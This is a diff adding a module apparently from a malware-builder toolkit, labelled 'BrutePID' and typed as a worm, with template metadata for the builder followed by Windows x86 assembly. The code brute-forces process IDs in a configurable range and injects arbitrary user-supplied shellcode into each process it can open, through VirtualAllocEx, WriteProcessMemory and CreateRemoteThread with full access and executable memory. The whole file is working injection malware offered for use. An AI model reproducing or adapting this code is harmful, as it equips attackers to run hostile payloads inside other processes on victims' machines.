@@ -1,0 +1,123 @@
+#!name##BrutePID
+#!types##worm
+#!info##A worm that tries to inject shellcode into a process. It checks each process PID from the given range and tries to inject shellcode.
+#!system_FLAG##[W]
+#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##OS_EXEC##win##Target system executable
+#!processWorm##BasicAsm
+#!lang##asm
+#!reqVar##BP_start_pid##The PID number from which the process search begins.##int
+#!reqVar##BP_max_pid##Last PID number of the process.##int
+#!reqVar##BP_shellcode##Shellcode to execute. You can paste your own or use ready-made ones from the FOOD section.##str##LOAD_SHELLCODE:True
+#!setVar##BP_start_pid##900##int
+#!setVar##BP_max_pid##11000##int
+#!globalVar##COMPILER_NO_DLL##Not include DLLs
+#!banned##module##starter##shadow##junk
+
+                    
+extern _ExitProcess@4
+extern _GetLastError@0
+extern _OpenProcess@12
+extern _VirtualAllocEx@20
+extern _WriteProcessMemory@20
+extern _CreateRemoteThread@28
+extern _WaitForSingleObject@8
+
+section .data
+    shellcode: db {{BP_shellcode}}
+    shellcode_len: equ $ - shellcode
+    
+    
+section .bss
+    target_pid: resd 1
+    proc_handle: resd 1
+    mem_addr: resd 1
+    bytes_written: resd 1
+    th_handle: resd 1
+
+section .text
+    global _main
+
+_main:
+    mov [target_pid], dword {{BP_start_pid}}
+    call _Set_Target
+    call _Exit
+
+_Set_Target:
+    mov eax, [target_pid]
+    cmp eax, dword {{BP_max_pid}}
+    je _Exit
+    
+    mov eax, [target_pid]
+    inc eax
+    mov [target_pid], eax   ; save next PID
+    call _INJECT
+    jmp _Set_Target
+
+_INJECT:
+    call _OpenProcess
+    call _AllocMemory
+    call _WriteMemory
+    call _CreateThread
+    jmp _Exit
+ 
+
+_OpenProcess:
+    push dword [target_pid]    ; dwProcessId
+    push 0          ; bInheritHandle
+    push 0x001FFFFF ; PROCESS_ALL_ACCESS
+    call _OpenProcess@12
+    cmp eax, 0
+    je _ERROR
+    mov [proc_handle], eax  ; save process handler
+    ret
+
+_AllocMemory:
+    push dword 0x40     ; PAGE_EXECUTE_READWRITE
+    push dword 0x00001000 | 0x00002000      ; MEM_COMMIT | MEM_RESERVE
+    push shellcode_len
+    push dword 0        ; lpAddress
+    push dword [proc_handle]    ; process handler
+    call _VirtualAllocEx@20
+    cmp eax, 0
+    je _ERROR
+    mov [mem_addr], eax     ; save memory address
+    ret
+
+_WriteMemory:
+    push bytes_written      ;A pointer to a variable that receives the number of bytes transferred into the specified process.
+    push shellcode_len
+    push shellcode
+    push dword [mem_addr]
+    push dword [proc_handle]
+    call _WriteProcessMemory@20
+    cmp eax, 0
+    je _ERROR
+    ret
+    
+_CreateThread:
+    push 0      ; lpThreadId
+    push 0      ; dwCreationFlags
+    push 0      ; lpParameter
+    push dword [mem_addr]     ; lpStartAddress
+    push 0      ; dwStackSize
+    push 0      ; lpThreadAttributes
+    push dword [proc_handle]      ;hProcess
+    call _CreateRemoteThread@28
+    cmp eax, 0
+    je _ERROR
+    mov [th_handle], eax    ; save thread handler
+    
+    push 0xFFFFFFFF  ; INFINITE
+    push dword [th_handle]
+    call _WaitForSingleObject@8
+    ret
+    
+_ERROR:
+    jmp _Set_Target
+
+_Exit:  
+    push 0
+    call _ExitProcess@4
+    
+
